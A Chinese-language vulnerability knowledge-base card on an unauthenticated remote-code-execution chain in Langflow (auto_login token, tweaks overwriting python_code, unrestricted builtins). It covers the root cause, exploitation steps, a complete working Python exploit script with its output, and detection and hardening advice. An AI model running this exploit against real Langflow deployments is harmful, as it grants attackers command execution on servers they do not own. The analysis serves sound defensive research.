---
id: ai-security-agent-security-langflow-auto-login-tweaks-pythonrepl-builtins-rce
title: Langflow CVE-2026-10561 未授权 RCE：auto_login 签发 superuser JWT + /run tweaks 覆盖 python_code + PythonREPL 隐式 __builtins__
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: langflow-auto-login-tweaks-pythonrepl-builtins-rce
tags:
- langflow
- ai
- agent
- unauth
- rce
- jwt
- tweaks
- pythonrepl
- builtins
- exec
- cve-2026-10561
cve:
- CVE-2026-10561
severity: critical
confidence: high
status: verified
affected_versions: Langflow 1.9.3（原文实测复现版本；未给出修复版本/完整区间）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V101
  verified_at: '2026-11-05T22:44:14+08:00'
  notes: 已对照原文与图01-09核对：auto_login 无凭据返回 bearer JWT、create_user_longterm_token 取 superuser/365天；/run tweaks 在 Graph.from_payload 前覆盖节点模板、apply_tweaks 只拦 code 不拦 python_code；PythonREPLComponent 的 globals 未设 __builtins__，__import__('os').popen 可执行；贴出的 verbose 输出 8/8（uid=1000 gid=0、whoami=user、open /etc/hostname=50f4ae5aaffd、__builtins__=dict、env leak、pwd=/app）与图07逐行一致；docker-compose 的 LANGFLOW_AUTO_LOGIN/LANGFLOW_SKIP_AUTH_AUTO_LOGIN 前提也一致。CVE-2026-10561 编号与原文一致。affected_versions 保留作者标注的 1.9.3（实测版本，未给修复区间），本次未改。未在本机执行 PoC。
url: /docs/ai-security/agent-security/ai-security-agent-security-langflow-auto-login-tweaks-pythonrepl-builtins-rce/
draft: false
kb_aliases:
- CVE-2026-10561
- Langflow auto_login
- LANGFLOW_AUTO_LOGIN
- PythonREPLComponent
- global_imports 绕过
- __builtins__ 自动注入
- tweaks 覆盖 python_code
- Langflow 未授权 RCE
---

## 一句话结论

Langflow 1.9.3 在 `AUTO_LOGIN=true` 时，`GET /api/v1/auto_login` 无需任何凭据就签发一枚 365 天有效的 superuser access token；拿到 token 后可走正常 API 创建含 `PythonREPLComponent` 的 Flow，并在 `POST /api/v1/run/{flow_id}` 的 `tweaks` 中覆盖该节点的 `python_code`（框架只拦截名为 `code` 的字段，不拦 `python_code`）；组件执行时其 globals 字典未显式设置 `__builtins__`，CPython 自动注入完整 builtins，`__import__('os').popen('id')` 即可在目标容器内执行命令——三段边界（身份、配置、执行）首尾衔接，构成未授权 RCE（CVE-2026-10561）。

## 原理

- **第一段：auto_login 把认证边界变成开门**：`src/backend/base/langflow/api/v1/login.py` 的 `auto_login` 是一个 `GET` 接口；当 `auth_settings.AUTO_LOGIN` 为真时，不要求用户名/密码/验证码/API key，直接调用 `create_user_longterm_token(db)` 并返回 `access_token` 与 `refresh_token`（后者为 null），同时设置 cookie。`create_user_longterm_token` 取配置的 `SUPERUSER`，找不到就回退到任意已存在的 superuser；签发的是 `type=access`、有效期 `timedelta(days=365)` 的 token。也就是说，打开自动登录开关后，任何能访问该接口的人都能获得后续 API 认可的高权限身份，而不是“仅用于引导 UI 的临时状态”。
- **第二段：/run 的 tweaks 在图构造前改写节点模板**：`POST /api/v1/run/{flow_id}` 接收 `SimplifiedAPIRequest`，其中 `tweaks` 可按节点 ID/显示名覆盖字段。`simple_run_flow()` 的顺序是：`flow.data.copy()` → `process_tweaks(graph_data, input_request.tweaks)` → `Graph.from_payload(graph_data)`。因此 tweaks 不是在执行后附加参数，而是在运行时图对象构建之前直接改写图的源数据。`apply_tweaks()` 遍历 `node.data.node.template`，命中字段后按类型写 `value`/`file_path`；它显式阻止的只有字段名为 `code` 的覆盖，而 `PythonREPLComponent` 真正的执行字段叫 `python_code`——保护字段与实际 sink 字段不一致，导致覆盖成功。
- **第三段：PythonREPLComponent 的“模块白名单”不是沙箱**：`src/lfx/src/lfx/components/utilities/python_repl_core.py` 的 `get_globals(global_imports)` 只把 `global_imports` 中声明的模块导入到一个新字典，例如 `{"math": module, "pandas": module}`；`run_python_repl()` 用 `PythonREPL(_globals=globals_).run(self.python_code)` 执行代码。该字典没有显式设置 `__builtins__`。在 CPython 中，`exec(code, globals_dict)` 若 globals 中没有 `__builtins__`，解释器会自动补入完整的 builtins 命名空间。于是攻击者拿到的不是“白名单模块环境”，而是“白名单模块 + 完整 builtins”：`__import__`、`open`、`eval`、`exec`、`globals`/`locals`/`vars`/`dir`、`type`/`object` 等语言原语全部可用。
- **为什么 `__import__` 一存在，白名单就失败**：组件试图限制“可导入的模块”，却没有限制“谁还有能力再次导入模块”。`__import__("os").popen("id").read()` 直接绕过 `global_imports`；`open('/etc/hostname').read()` 提供文件读取；配合 `subprocess`、环境变量读取、容器内路径探测可继续扩大。前者是表层对象暴露，后者是语言原语暴露，层级不同，前者在后者存在时几乎没有安全意义。
- **结构性而非偶然**：三段分别解决“有没有身份”（auto_login 签发 superuser token）、“payload 怎么进去”（tweaks 覆盖配置字段）、“进去之后为什么真能跑”（builtins 自动注入 + `__import__`）。任一环缺失，链都难以闭合；三者同时成立，攻击者就能沿系统原生调用链稳定抵达 sink。
- **实测结果**：原文在 `langflowai/langflow:1.9.3` 容器中实测 8/8 检查通过：`id`、`whoami`、`subprocess`、`__import__ bypass`、`open` 读取、`__builtins__` 可用、环境变量泄露、`pwd=/app`；执行身份为 `uid=1000(user) gid=0(root)`，代码确实在目标容器内运行。
- **重要的配置前提**：原文 docker-compose 设置了 `LANGFLOW_AUTO_LOGIN=true` 与 `LANGFLOW_SKIP_AUTH_AUTO_LOGIN=true`；前者让 `auto_login` 直接发 token，后者跳过较新版本里 auto_login 的额外校验。缺少这两个变量，链路可能在第一步就断掉；实际目标是否开启自动登录需要先确认。

## 触发条件

- Langflow 1.9.3（原文实测复现版本；未给出修复版本/完整区间，其他版本需实测）。
- 目标开启 `LANGFLOW_AUTO_LOGIN=true`（部分版本还需要 `LANGFLOW_SKIP_AUTH_AUTO_LOGIN=true`），使 `/api/v1/auto_login` 无凭据签发 token。
- 7860 端口/API 可从攻击者网络访问；`/health` 正常。
- 目标实例中存在 `PythonREPLComponent`（默认组件清单 `/api/v1/all` 的 `utilities` 分类中可见），且允许通过 API 创建 Flow、运行 Flow。
- `tweaks` 路径未禁止覆盖 `python_code` 等执行型字段；`apply_tweaks` 的字段黑名单只覆盖 `code`。
- 组件执行环境未把 `__builtins__` 显式置为受限对象/空字典，也未使用真正的进程/容器沙箱；容器用户具备命令执行与文件读取能力（默认即有）。

## 利用步骤

1. **确认服务可用**：`GET /health` 返回 `{"status":"ok"}`。
2. **无凭据拿 token**：`GET /api/v1/auto_login`，从 JSON 取 `access_token`；确认 `token_type=bearer`。这一步不需要任何用户名、密码或 API key。
3. **枚举组件模板**：带 `Authorization: Bearer <token>` 请求 `GET /api/v1/all`，在返回的分类字典里找到 `PythonREPLComponent`（原文位于 `utilities` 分类），记录其完整模板。
4. **创建恶意 Flow**：`POST /api/v1/flows/`，提交一个只含 `PythonREPLComponent` 节点的图；节点 `data.node` 使用上一步模板，`template.python_code.value` 可先设为 benign 代码（如 `print('flow ready')`），`data.nodes[].id` 与节点键保持一致。
5. **用 tweaks 覆盖执行字段**：`POST /api/v1/run/{flow_id}`，body 包含 `input_value`、`input_type: "text"`、`output_type: "debug"` 与：
   ```json
   {"tweaks": {"PythonREPLComponent-poc": {"python_code": "import os\nprint(os.popen('id').read())"}}}
   ```
   服务端 `process_tweaks()` 在 `Graph.from_payload()` 前把节点模板的 `python_code.value` 改成攻击者代码。
6. **验证 RCE**：从响应 `outputs[].outputs[].results.message.result` 或 `artifacts` 中提取执行输出；测试 `import os; os.popen('id')`、`__import__('os').popen('id')`、`open('/etc/hostname').read()`、`print(type(__builtins__).__name__)`、`os.getcwd()` 等。
7. **扩大影响**：读取环境变量/配置文件、写入文件、反弹 shell、下载二阶段；若容器以特权模式运行或挂载 Docker Socket，可进一步逃逸到宿主机。

## PoC

核心利用脚本（原文最小版 `exploit.py` 的关键逻辑）：

```python
import json, requests

TARGET = "http://localhost:7860"
API = f"{TARGET}/api/v1"

# 1) 无凭据拿 superuser JWT
token = requests.get(f"{API}/auto_login", timeout=15).json()["access_token"]
H = {"Authorization": f"Bearer {token}"}

# 2) 从 /all 找 PythonREPLComponent 模板
data = requests.get(f"{API}/all", headers=H, timeout=30).json()
template = None
for category, components in data.items():
    if category == "component_display_names":
        continue
    if isinstance(components, dict) and "PythonREPLComponent" in components:
        template = components["PythonREPLComponent"]
        break

# 3) 创建只含该节点的 Flow
flow_data = {
    "name": "CVE-2026-10561-PoC",
    "description": "PoC",
    "data": {
        "nodes": [{
            "id": "PythonREPLComponent-poc",
            "type": "genericNode",
            "position": {"x": 100, "y": 100},
            "data": {
                "id": "PythonREPLComponent-poc",
                "type": "PythonREPLComponent",
                "node": template,
            },
        }],
        "edges": [],
    },
}
flow_id = requests.post(f"{API}/flows/", headers=H, json=flow_data, timeout=30).json()["id"]

# 4) tweaks 覆盖 python_code 并运行
payload = {
    "input_value": "",
    "input_type": "text",
    "output_type": "debug",
    "tweaks": {
        "PythonREPLComponent-poc": {
            "python_code": "print(__import__('os').popen('id').read().strip())"
        }
    },
}
r = requests.post(f"{API}/run/{flow_id}", headers=H, json=payload, timeout=60)
print(r.json())
```

原文实测输出（节选）：

```text
[+] JWT acquired: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
[+] PythonREPLComponent found in category: utilities
[+] Flow created: 01acf974-ee3d-4bdc-916e-3df87d1c19a2
[OK] RCE (id)               -> uid=1000(user) gid=0(root) groups=0(root)
[OK] RCE (whoami)           -> user
[OK] RCE (subprocess)       -> uid=1000(user) gid=0(root) groups=0(root)
[OK] __import__ bypass      -> uid=1000(user) gid=0(root) groups=0(root)
[OK] open builtin           -> 50f4ae5aaffd
[OK] __builtins__ avail     -> dict
[OK] env leak               -> true
[OK] pwd                    -> /app
[+] 8/8 checks passed
[+] EXPLOITATION SUCCESSFUL — unauthenticated RCE confirmed!
```

## 变体与关联

- **其他执行型组件**：任何“代码/脚本/表达式”字段可被 tweaks 覆盖的组件（PythonCode、自定义组件、脚本节点）都可能复用；关键是找到 `apply_tweaks` 黑名单与实际 sink 字段不一致的字段名。
- **auto_login 配置变体**：不同版本可能要求 `LANGFLOW_SKIP_AUTH_AUTO_LOGIN=true`；若目标未开启自动登录，需要另找认证绕过或凭据泄露。superuser 回退逻辑（找不到配置的 SUPERUSER 就用第一个 superuser）提高了不同部署下的成功率。
- **Python 执行环境变体**：即使 `global_imports` 为空或只含安全模块，只要 `__builtins__` 未显式收紧，`__import__/open/eval/exec` 就可用；真正的沙箱需要进程隔离、seccomp、只读文件系统、无网络等，而不是裁剪 globals 名字。
- **容器逃逸**：原文容器身份 `uid=1000(user) gid=0(root)`，且工作目录 `/app`；若挂载 Docker Socket、以 privileged 运行或共享宿主目录，RCE 可进一步逃逸。
- **关联卡片**：[[ai-security-agent-security-langflow-build-public-tmp-data-code-exec]]（同一产品的另一条未认证组件执行链，CVE-2026-33017）、[[ai-security-mcp-security-langflow-flow-node-mcp-stdio-authorization-bypass]]（Langflow 流程节点绕过 MCP stdio 授权限制）、[[binary-pwn-sandbox-escape-python-builtins-none-list-dict-alias]]（__builtins__ 受限时的恢复思路，对照“未设置 __builtins__ 会被自动注入”）。

## 检测与防御

- **关闭自动登录/强制认证**：生产环境不要设置 `LANGFLOW_AUTO_LOGIN=true`；确保 `auto_login` 不会对匿名请求签发 superuser token；如必须自动登录，限制监听地址/网络来源并加反向代理认证。
- **升级/补丁**：跟踪 CVE-2026-10561 的官方修复版本；在修复前限制 7860 端口暴露，禁止不可信网络访问 `/api/v1/auto_login`、`/api/v1/flows/`、`/api/v1/run/*`。
- **字段级准入**：tweaks 只允许覆盖白名单字段（非执行型输入），把 `python_code`、`code`、`script`、`expression`、`command` 等所有执行型字段统一拦截；黑名单必须与实际 sink 读取的字段名对齐，不能只拦 `code`。
- **执行隔离**：不要把 PythonREPLComponent 暴露给不可信用户；如必须使用，在独立容器/进程中执行，非 root、只读根文件系统、无 Docker Socket、默认阻断出站、限制 CPU/内存/进程/时间；不要依赖“只导入指定模块”作为安全边界。
- **权限最小化**：Flow 创建/运行 API 需要强认证与授权；不同租户/用户隔离；superuser token 不应长期有效（365 天过长），应短时效 + 刷新 + 可吊销。
- **监控与应急**：告警匿名 `/api/v1/auto_login` 调用、短时间内创建 Flow 并立即 run、tweaks 中出现 `python_code`/`code`/`os.popen`/`subprocess`/`__import__` 等特征；检查容器内异常进程、文件写入、环境变量读取与出站连接；发现后隔离实例、轮换 superuser token/密钥、审计 Flow 与组件配置。
